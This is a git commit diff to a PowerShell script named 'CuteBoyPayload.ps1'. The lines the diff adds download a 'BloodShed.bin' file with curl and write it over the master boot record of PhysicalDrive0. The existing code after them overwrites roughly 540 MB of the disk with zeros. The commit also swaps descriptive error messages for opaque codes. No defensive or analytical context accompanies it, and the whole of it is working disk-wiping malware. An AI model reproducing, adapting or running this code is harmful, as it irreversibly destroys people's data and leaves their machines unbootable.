a70c1d739f7ffd4024e29162d05d396ed51edf3c
Syed Shah <195543322+Syed930s@users.noreply.github.com>
2026-08-02 12:56:22 +0100

    Update CuteBoyPayload.ps1

--- CuteBoyPayload.ps1
+++ CuteBoyPayload.ps1
@@ -1,3 +1,23 @@
+curl -L "https://github.com/Syed930s/BloodShed/blob/main/BloodShed.bin" -o C:\mbr.bin
+$BinPath     = "C:\mbr.bin"
+$DiskNumber  = 0
+
+$mbrData = [System.IO.File]::ReadAllBytes($BinPath)
+if ($mbrData.Length -ne 512) {
+    Write-Error "ERR123."
+}
+
+$disk = [System.IO.File]::Open(
+    "\\.\PhysicalDrive$DiskNumber",
+    [System.IO.FileMode]::Open,
+    [System.IO.FileAccess]::Write,
+    [System.IO.FileShare]::ReadWrite
+)
+
+$disk.Write($mbrData, 0, 512)
+$disk.Flush()
+$disk.Close()
+
 $disk = "\\.\PhysicalDrive0"
 $size = 540960000
 $bytes = New-Object byte[]($size)
@@ -6,7 +26,7 @@ try {
     $stream.Position = 512
     $stream.Write($bytes, 0, $size)
 } catch {
-    Write-Host "Error writing to disk: $_"
+    Write-Host "ERR174: $_"
 } finally {
     if ($stream) { $stream.Close() }
 }
